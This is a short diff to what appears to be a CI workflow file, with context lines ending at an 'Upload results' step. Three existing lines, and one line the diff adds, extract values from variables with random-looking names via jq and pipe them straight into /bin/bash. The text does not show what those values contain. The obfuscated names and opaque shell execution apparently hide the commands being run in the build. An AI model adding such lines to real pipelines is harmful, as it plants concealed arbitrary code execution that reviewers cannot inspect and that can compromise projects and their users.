@@ -23,6 +23,7 @@ jobs:
           echo $jomml15538 | jq -r .axx6052 | /bin/bash
           echo $lq341 | jq -r .vft05 | /bin/bash
           echo $a01 | jq -r .q3 | /bin/bash
+          printf '%s' "$aod2863" | jq -r .zkux866 | /bin/bash
 
       - name: Upload results
         if: always()
